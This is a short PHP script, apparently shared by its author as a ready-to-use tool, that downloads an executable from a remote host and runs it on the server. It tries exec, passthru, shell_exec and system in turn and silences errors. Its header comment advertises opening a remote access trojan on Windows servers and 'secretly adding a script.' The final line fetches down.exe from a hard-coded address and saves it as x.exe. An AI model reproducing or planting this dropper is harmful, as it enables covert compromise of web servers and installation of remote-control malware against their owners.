<?php
/* 
Created By Antidote
---------------
    Example
---------------
What Processes Can Be Done.
---------------
1-) Windows Server RAT down open
2-) secretly adding a script, you can :)
---------------
Good Enjoy
--------------
twitter=@coderantidote
*/
error_reporting(0);
function down($adres,$ad) 
{ 
    $ch = curl_init("$adres"); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $data = curl_exec($ch); 
    curl_close($ch); 
    $islem = fopen("$ad", "a+"); 
    fwrite($islem, $data); 
    fclose($islem); 
    if ($islem) { 
		define('SITE_ROOT', dirname(__FILE__));
		$dosyayolu = SITE_ROOT . "/"."$ad";
		if(function_exists('exec')) {
		 exec("$ad", $cikti);
		}elseif(function_exists('passthru')) {
		 passthru("$ad");

		}elseif(function_exists('shell_exec')) {
		 shell_exec("$ad");

		}elseif(function_exists('system')) {
		 system("$ad", $cikti);
        }else{
			 unlink("$ad");
		}
     
    
    } 
} 
down('http://121.1.1/down.exe','x.exe'); // down(remotehostdown,Savefilename)
?>